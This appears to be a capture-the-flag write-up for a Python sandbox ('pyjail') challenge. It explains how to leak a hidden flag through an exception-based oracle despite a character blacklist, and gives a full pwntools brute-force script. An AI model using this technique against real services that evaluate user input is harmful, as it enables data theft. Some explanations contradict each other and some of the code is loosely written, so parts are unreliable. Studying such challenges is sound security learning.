Source code:
```
#!/usr/local/bin/python
flag = "".join([chr(i) for i in range(97, 123)] + ["{}"] + [chr(i) for i in range(65, 91)] + ["_"]) #example flag
for _ in [flag]:
    while True:
        try:
            code = ascii(input("Give code: "))
            if any([i in code for i in "lite0123456789 :< :( ): :{ }: :*\ ,-."]):
                print("invalid input")
                continue
            exec(eval(code))
        except Exception as err:
            print("zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz")
```
OK now is the big boss. the previous two challs were really ez, since we used the exception handler.
Now, we are both limited asfuck, and it will not print the error to us.
BUT, we do know when an error occured. `zzzzz..zz` will be printed.
This is really helpull for us. we can trigger an error when some of condition is met, and we'll know if its true or not.
I used this trick to do a bruteforce byte byte on each character of the flag, and trigger an exception each time the character isn't correct.
First of all, we need numbers. its the key to win this challenge, and its not trivial because `0123456789` is restricted.
But, we can see that we can still use `=`. this is good to us, since we can just do `n='a'!='a'` and get `False`, which is equivilent to zero in python,
and `p='a'=='a'` to get one.
Then, we can change it as much as we want by doing something like `n=n+p`, which will add 1 to n each time.
Firstly, lets leak the size of the flag.
As we know, when u try to reach an outofbounds character in a string in python, an exception will be thrown.
We can use it here, and reach character in the flag until an error occured, and then we can know the length:

```py
def get_size():
	send("o='a'!='a'") #o = 0
	send("p='a'=='a'") #p = 1
	for i in range(100):
		send(f"_[o]")
		res = p.recvn(1)
		if res == b'z': #if it gave error
			return i
		send("o=o+p")
```

Now we can know the size of the flag!
But how can we know its contents? there is not really an exception we can use, since `{}` is forbidden and we can't use the same dict trick.
But, what about using the outofbounds error aswell? we can have a 1 element array, `m=['a']`.
Now, we'll brute force the character at `_[o]`, when `o` is an incrementer.
We'll iterate through each character in `chars = [chr(i) for i in range(97, 123)] + [chr(i) for i in range(65, 91)] + ["_"]`.
Then, we can use the expression `_[o] != '{c}'` to know if the current character is c or not. if it is `c`, it will return False, and if its not, it will return True.
But as we saw, False/True are equivilent to 0/1. we can create an array `m=['A']`. then, we can do `f"m[_[o]!='{c}']"`. if the character is not c, it will try to reach `m[1]` which will return an exception.
But if the next character is c, it will return an error to us! this way we can leak char-char the flag. Here is my code:
```py
chars = [chr(i) for i in range(97, 123)] + [chr(i) for i in range(65, 91)] + ["_"]
p = remote('amt.rs', 31672)

flag_size = 97 # get_size()

send("o='a'!='a'") #o = 0
send("p='a'=='a'") #p = 1
send("m=['A']")
flag = ""
for j in range(flag_size):
  found = False
	for c in chars:

		send(f"m[_[o]!='{c}']")
		res = p.recvn(1)
		if res == b'G': #if it didn't gave error
			flag += c
			found = True
			break
```
Look correct, right?
lets try to run it locally with
`flag = "".join([chr(i) for i in range(97, 123)] + ["{}"] + [chr(i) for i in range(65, 91)] + ["_"])`
and we'll get `abcdfghjkmnopqrsuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_`. as u can see, all the blacklisted character aren't here. this happens because when we try to send `send(f"m[_[o]!='{c}']")` when c is blacklisted, it will continue.
We need a creative way of leaking blacklisted characters.
I have used the > operand to achieve that.

I created a function called `check_blacklisted`, which will take in a blacklisted charcter, and check if its the charcter at `_[o]`. I called the function like this:
```py
	if not found:
		for c in  sorted("lite{}")[::-1]: #blacklisted characters that can be in the flag
			if check_blacklisted(c):
				flag += c
				found = True
				break
		if not found:
			flag += '.'
```
My approach was simple; we can take the character before `c` in tems of ascii value, and check if its smaller than `_[o]`. we iterate through `sorted("lite{}")`, so once we find one character thats smaller then `c`, we know that c is in the flag.

```py
def check_blacklisted(c):
	low = ord(c) -1

	send(f"m[_[o]>'{chr(low)}']")
	res = p.recvn(1)

	if res == b'z': #if it gave error
		return True
	return False
```

So this way we can know each character in the flag! this was a really interseting challenge for me, and it was a good introudction to pyjails which I always wanted to learn.
Here is the complete code:
```
from pwn import *


def send(a):
	global p
	p.recvuntil("code: ")
	p.sendline(a)

def get_size():
	send("o='a'!='a'") #o = 0
	send("p='a'=='a'") #p = 1
	for i in range(100):
		send(f"_[o]")
		res = p.recvn(1)
		if res == b'z': #if it gave error
			return i
		send("o=o+p")

def check_blacklisted(c):
	low = ord(c) -1

	send(f"m[_[o]>'{chr(low)}']")
	res = p.recvn(1)

	if res == b'z': #if it gave error
		return True
	return False

chars = [chr(i) for i in range(97, 123)] + [chr(i) for i in range(65, 91)] + ["_"]

p = process(['python3', 'main.py'])

flag_size = get_size()

send("o='a'!='a'") #o = 0
send("p='a'=='a'") #p = 1
send("m=['A']")
flag = ""
for j in range(flag_size):
	found = False

	for c in chars:

		send(f"m[_[o]!='{c}']")
		res = p.recvn(1)
		if res == b'G': #if it didn't gave error
			print("here")
			flag += c
			found = True
			break
	if not found:
		for c in  sorted("lite{}")[::-1]: #blacklisted characters that can be in the flag
			if check_blacklisted(c):
				flag += c
				found = True
				break
		if not found:
			flag += '.'
	print(flag, j)
	send("o=o+p") #o will increament each run

```

